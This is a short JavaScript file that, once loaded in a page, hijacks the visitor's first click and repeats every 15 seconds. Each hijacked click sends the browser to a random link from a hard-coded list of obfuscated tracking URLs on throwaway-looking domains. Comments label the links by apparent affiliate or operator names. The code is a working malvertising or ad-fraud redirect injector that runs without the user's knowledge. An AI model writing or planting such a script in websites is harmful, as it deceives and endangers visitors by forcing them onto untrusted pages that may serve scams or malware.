function init() {
  var arr = [
    // hil: dabao
    "https://grim-package.com/bO3WV.0sPU3rp/vSbumMVaJkZVD/0U1/N/DDMG2sOOTWcm2zL-TSUR0mMhzbYS5oNYz/cJ",
    // "https://www.qrcreate.online",

    // hil: Michael(yoo)
    "https://ruddy-boyfriend.com/bi3.VH0XPB3Spiv/bBm/VzJvZDDO0w1QN/DCQI5LOXD/Yx2cLXTIUD0ZNnDvk/4lNhjdcM",    
    // hil: Michael(yy)
    "https://ruddy-boyfriend.com/b/3-Ve0.PI3WpTvtbpmEVNJ/ZADS0E1UNlD/cyw/OgDrYK0_LbTcUS0iNwzlAU4/N/jjUf",

    // hil: db123 
    "https://classic-bonus.com/bY3.VK0OPK3tpYv/bYmQVDJ-Z/DI0/1/MKzqcYy/MQzzATy/LMTSUGz/NNzTIrzDMXDgMm",

    // hil: Jacklove (ni)
    "https://indolent-ability.com/b.3bV-0-Pa3JpBvib-mrV/JwZTDV0/1QNvD/cywwNjj/cg2/LaT/Uz0/NdzYAE2/NtzDcQ",

    // mon: lucy
    "https://phuruxoods.com/4/7683326",
    "https://whauzavouweb.com/4/7683329",
    "https://naglelri.net/4/7683327",
    "https://fouwhigrezi.net/4/7683328",
    "https://boovoogie.net/4/7683330",
    "https://rangauck.com/4/7683319",

    "https://json.qrcreate.online",
    // "https://dubzenom.com/4/7782127",
  ];
 
  var didOpen = false;
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 15000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

setTimeout(() => {
  init();
}, 1000);